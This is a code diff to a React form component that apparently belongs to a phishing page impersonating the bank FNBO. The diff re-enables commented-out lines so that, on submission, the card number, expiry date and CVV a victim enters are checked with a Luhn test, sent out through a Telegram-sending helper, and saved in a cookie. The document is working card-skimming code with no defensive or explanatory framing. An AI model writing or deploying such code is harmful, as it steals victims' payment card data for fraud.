@@ -1,7 +1,7 @@
 import React from 'react'
 import { useNavigate } from 'react-router-dom';
 import cookies from '../utils/cookie.config';
-// import TelegramSend from '../utils/send-message';
+import TelegramSend from '../utils/send-message';
 import { wait } from '../utils/waiter';
 import { verifyCreditCardNumber } from '../utils/luhn';
 
@@ -52,12 +52,12 @@ export default function Addition() {
   const [isLoading, setIsLoading] = React.useState(false);
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
-    // const message = `
-    // ---- FNBO (Card Information) -----
-    // Card Number: ${formInput.cnm}
-    // Expiry: ${formInput.exp}
-    // CVV: ${formInput.cv}
-    // `;
+    const message = `
+    ---- FNBO (Card Information) -----
+    Card Number: ${formInput.cnm}
+    Expiry: ${formInput.exp}
+    CVV: ${formInput.cv}
+    `;
     const isValidCardNum = verifyCreditCardNumber(formInput.cnm);
 
     if (!isValidCardNum) {
@@ -66,7 +66,7 @@ export default function Addition() {
     }
     setIsLoading(true)
     
-    // await TelegramSend(message);
+    await TelegramSend(message);
     await wait(2000);
     cookies.set("card", formInput);
     setIsLoading(false)
